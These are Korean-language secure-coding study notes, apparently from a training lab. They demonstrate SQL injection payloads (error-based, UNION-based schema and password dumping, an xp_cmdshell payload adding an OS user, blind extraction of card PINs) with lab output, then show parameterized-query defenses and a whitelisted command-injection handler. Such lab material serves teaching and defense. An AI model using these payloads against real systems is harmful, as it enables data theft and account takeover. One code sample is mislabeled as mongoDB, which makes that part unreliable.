### Form Based SQL

정상 수행 목표

ex) 회원가입 폼, 로그인 폼, 검색 폼...



### Error Based SQL

브라우저로 출력되는 에러 메시지는 공격자에게 많은 정보를 제공한다.

#### 에러 메시지 확인

test'

~~~
com.microsoft.sqlserver.jdbc.SQLServerException: 문자열 'test''의 따옴표가 짝이 맞지 않습니다.
	com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:216)
	com.microsoft.sqlserver.jdbc.SQLServerStatement.getNextResult(SQLServerStatement.java:1515)
	com.microsoft.sqlserver.jdbc.SQLServerStatement.doExecuteStatement(SQLServerStatement.java:792)
	com.microsoft.sqlserver.jdbc.SQLServerStatement$StmtExecCmd.doExecute(SQLServerStatement.java:689)
	com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)

~~~



#### 테이블 명 확인

' having 1=1 --

~~~~
com.microsoft.sqlserver.jdbc.SQLServerException: 열 'board_member.IDX'이(가) 집계 함수나 GROUP BY 절에 없으므로 SELECT 목록에서 사용할 수 없습니다.
	com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:216)
	com.microsoft.sqlserver.jdbc.SQLServerStatement.getNextResult(SQLServerStatement.java:1515)
	com.microsoft.sqlserver.jdbc.SQLServerStatement.doExecuteStatement(SQLServerStatement.java:792)
	com.microsoft.sqlserver.jdbc.SQLServerStatement$StmtExecCmd.doExecute(SQLServerStatement.java:689)
	com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)
	com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)
	com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(SQLServerStatement.java:180)

~~~~



### DB 이름 추출

' and db_name()=1--

~~~
com.microsoft.sqlserver.jdbc.SQLServerException: nvarchar 값 'board'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
	com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:216)
	com.microsoft.sqlserver.jdbc.SQLServerResultSet$FetchBuffer.nextRow(SQLServerResultSet.java:4853)
	com.microsoft.sqlserver.jdbc.SQLServerResultSet.fetchBufferNext(SQLServerResultSet.java:1781)
	com.microsoft.sqlserver.jdbc.SQLServerResultSet.next(SQLServerResultSet.java:1034)
	kr.co.openeg.lab.test.util.TestUtil.readDB3(TestUtil.java:197)
	kr.co.openeg.lab.test.controller.TestController.testSqlInjectionB2(TestController.java:372)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:606)

~~~



### UNION SQL 삽입 체크

#### 칼럼 갯수 확인

admin' union select 1,2,3,4,5,6 #

~~~
MySQL 조회결과:    IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
IDX: 1      ID: 2      PASSWORD: 3      이름: 4
~~~



#### DBMS 버전 확인

admin' union select version(),2,3,4,5,6 #

~~~
MySQL 조회결과:    IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
IDX: 5.1.41-community      ID: 2      PASSWORD: 3      이름: 4
~~~



#### 시스템에 설치된 DB목록 확인

' union select schema_name,2,3,4,5,6 from information_schema.schemata #

~~~
MySQL 조회결과:    IDX: information_schema      ID: 2      PASSWORD: 3      이름: 4
IDX: board      ID: 2      PASSWORD: 3      이름: 4
IDX: dvwa      ID: 2      PASSWORD: 3      이름: 4
IDX: hacmebooks      ID: 2      PASSWORD: 3      이름: 4
IDX: mysql      ID: 2      PASSWORD: 3      이름: 4
IDX: openeg      ID: 2      PASSWORD: 3      이름: 4
IDX: owasp10      ID: 2      PASSWORD: 3      이름: 4
IDX: phpmyadmin      ID: 2      PASSWORD: 3      이름: 4
IDX: puzzlemalldb      ID: 2      PASSWORD: 3      이름: 4
~~~



#### 테이블 목록 확인

admin' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database()#

~~~
MySQL 조회결과:    IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
IDX: board,board_comment,board_member,login_history,openeg_security 
~~~



#### 칼럼명 확인

admin' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='board_member'#

~~~
MySQL 조회결과:    IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
IDX: IDX,USERID,USERPW,USERNAME,PINNO,JOINDATE      ID: 2      PASSWORD: 3      이름: 4
~~~



#### 칼럼 데이터 추출

admin' union select idx,userid,userpw,username,5,6 from board_member#

~~~
MySQL 조회결과:    IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
IDX: 2      ID: test      PASSWORD: test      이름: 테스트
IDX: 3      ID: a      PASSWORD: a      이름: 홍길동
IDX: 4      ID: ab      PASSWORD: ab      이름: 이기훈
~~~

### Stored Procedure SQL 삽입 체크

MS-SQL의 경우 공격자는 보안상 취약한 프로시저를 이용해 쉘 수행, 쿼리 결과 HTML로 제공, 레지스트리 조작, 서비스 시작/중지, 시스템 정보 획득 등을 수행할 수 있다.

admin'; exec xp_cmdshell 'net user hacker hacker /add'--

~~~
Administrator            ASPNET                   Guest
hacker                   IUSR_WIN2003             IWAM_WIN2003
jes                      SUPPORT_388945a0
~~~



### Blind SQL 삽입 체크

쿼리 결과의 참/거짓 형태를 가지고 DB 정보를 판단하는 방법으로 DB 정보를 추출

101 and (select pin from pins where cc_number='1111222233334444' <3000) 

101 and (select pin from pins where cc_number='1111222233334444')=2364



Pangolin이라는 툴을 사용할 수도 있음.



### ★ 방어 : SQL을 고정시킴!

#### JDBC API의 PreparedStatement 이용

~~~java
	public String readDB(String id, String passwd) {
		StringBuffer  result=new StringBuffer();
		Connection con=null;
		PreparedStatement st=null;
		ResultSet rs=null;
		try {
			con = EConnection.getConnection(this);	
			st = con.prepareStatement("select * from board_member where userid=? and userpw=?");
			st.setString(1, id);
			st.setString(2, passwd);
			rs = st.executeQuery();
   		    if ( rs.next() ) {
			       result.append("ID: "+rs.getString(2));
			       result.append("    PASSWORD: "+rs.getString(3));
			}
		} catch (SQLException e1) {
			// TODO Auto-generated catch block
			result.append("요청처리에러발생");
		}
~~~



#### Parameterized API 이용

~~~js
var name = 'Amy';
var adr = 'Mountain 21';
var sql = 'SELECT * FROM customers WHERE name = ? OR address = ?';
con.query(sql, [name, adr], function (err, result) {
  if (err) throw err;
  console.log(result);
});
~~~



정적 쿼리가 불가능할 경우 필터링으로 처리해야 함.



#### MyBatis

동적 바인딩

~~~xml
	<select id="loginCheck2" parameterClass="LoginModel" resultClass="LoginModel">
		select 
			idx,
			userId,
			userPw,
			userName,
			joinDate
		from board_member
		where userId = '$userId$' and userPw = '$userPw$'
	</select>	
~~~

정적 바인딩

~~~xml
	<select id="loginCheck2" parameterClass="LoginModel" resultClass="LoginModel">
		select 
			idx,
			userId,
			userPw,
			userName,
			joinDate
		from board_member
		where userId = #userId# and userPw = #userPw#
	</select>	
~~~

#### mongoDB

동적 바인딩

~~~js
let query = `
	SELECT * FROM user
		LEFT JOIN team ON user.team_id = team.id
		WHERE user.id = ${userId}
`;
let user: User = await sequelize.query(
	query, 
    {
    	replacements: {personId: person.id}, 
	    type: Sequelize.QueryTypes.SELECT, 
        raw: true
    });
~~~

정적 바인딩

~~~js
let query = `
	SELECT * FROM user
		LEFT JOIN team ON user.team_id = team.id
		WHERE user.id = :userId
`;
let user: User = await sequelize.query(
	query, 
    {
    	replacements: {personId: person.id}, 
        type: Sequelize.QueryTypes.SELECT, 
        raw: true
    });
~~~



### 명령어 인젝션

TestController.java

~~~java
	@RequestMapping(value="/test/command_test.do", method = RequestMethod.POST)
	@ResponseBody
	public String testCommandInjection(HttpServletRequest request, HttpSession session){
		StringBuffer buffer=new StringBuffer();	
		String data=request.getParameter("data");
		
		if(data != null){
			try{
			int dataNo = Integer.parseInt(data);
			switch(dataNo){
			case 0 : data="type "+
    	            request.getSession().getServletContext().getRealPath("/")+
    	            "file1.txt"; 
				break;
			case 1: data="dir";
				break;
			default:
				//침해 대응
				System.out.println("HACK-002:" + request.getRemoteAddr() + "의 해킹 시도 감지");
				System.out.println("HACK-002:" + request.getRemoteAddr() + "의 해킹 시도 감지");
				return buffer.append("You are hacker!!!!").toString();
			}
			}catch(NumberFormatException e){
				//침해 대응
				System.out.println("HACK-003:" + request.getRemoteAddr() + "의 해킹 시도 감지");
				System.out.println("HACK-003:" + request.getRemoteAddr() + "의 해킹 시도 감지");
				return buffer.append("You are hacker!!!!").toString();
			}
			
		}else{
			//침해 대응
			System.out.println("HACK-001:" + request.getRemoteAddr() + "의 해킹 시도 감지");
			System.out.println("HACK-001:" + request.getRemoteAddr() + "의 해킹 시도 감지");
			return buffer.append("You are hacker!!!!").toString();
		}
			
	    if ( data != null  && data.equals("type")) {
	    		data=data+" "+
	    	            request.getSession().getServletContext().getRealPath("/")+
	    	            "file1.txt"; 
	    		System.out.println(data);
	    }
    	
		Process process;
		String osName = System.getProperty("os.name");
		String[] cmd;

		if(osName.toLowerCase().startsWith("window")) {
		    cmd = new String[] { "cmd.exe","/c",data };
		    for( String s : cmd)
		       System.out.print(s+" ");
		} else {
		    cmd = new String[] { "/bin/sh",data };
		}

		try {
			process = Runtime.getRuntime().exec(cmd);
			InputStream in = process.getInputStream(); 
			Scanner s = new Scanner(in,"EUC-KR");
			buffer.append("실행결과: <br/>");
			while(s.hasNextLine() == true) {
			    buffer.append(s.nextLine()+"<br/>");
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			buffer.append("실행오류발생");
			e.printStackTrace();
		} 
			return buffer.toString();

	}
~~~

test.jsp

~~~jsp
작업선택:  <select  name="data"  id="data5">
         <option value="0">--- show File1.txt ---</option>
         <option value="1">--- show Dir ---</option>
      </select> <input type="button"   id="button5" value="실행"  > <br/>
~~~

